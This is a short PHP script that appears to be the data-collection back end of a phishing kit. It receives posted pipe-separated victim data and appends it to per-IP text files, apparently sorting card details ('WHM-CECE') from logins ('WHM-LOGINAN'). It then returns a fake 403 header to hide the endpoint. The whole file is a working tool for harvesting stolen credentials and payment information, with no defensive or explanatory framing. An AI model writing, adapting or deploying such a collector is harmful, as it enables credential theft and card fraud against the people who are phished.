<?php
// Error Handel
error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', 'abnormal_error.log');

$json = json_decode(file_get_contents('php://input'),true);

$setting = [
    "folder" => "ABNORMAL-RESULT"
];

if(!is_dir($setting['folder'])) mkdir($setting['folder']);

if (empty($json['data'])) redirect403();
if (!preg_match("/-_abnormal_-/i", str_replace(["|"], "-_abnormal_-", $json['data']))) redirect403();

$jumlah = count(explode("|", $json['data']));
if ($jumlah > 7) {
    file_put_contents("{$setting['folder']}/WHM-CECE-{$_SERVER['REMOTE_ADDR']}.txt", $json['data'].PHP_EOL, FILE_APPEND);
}else{
    file_put_contents("{$setting['folder']}/WHM-LOGINAN-{$_SERVER['REMOTE_ADDR']}.txt", $json['data'].PHP_EOL, FILE_APPEND);
}

redirect403();

function redirect403() {
    exit(header('HTTP/1.0 403 Not Found'));
}
?>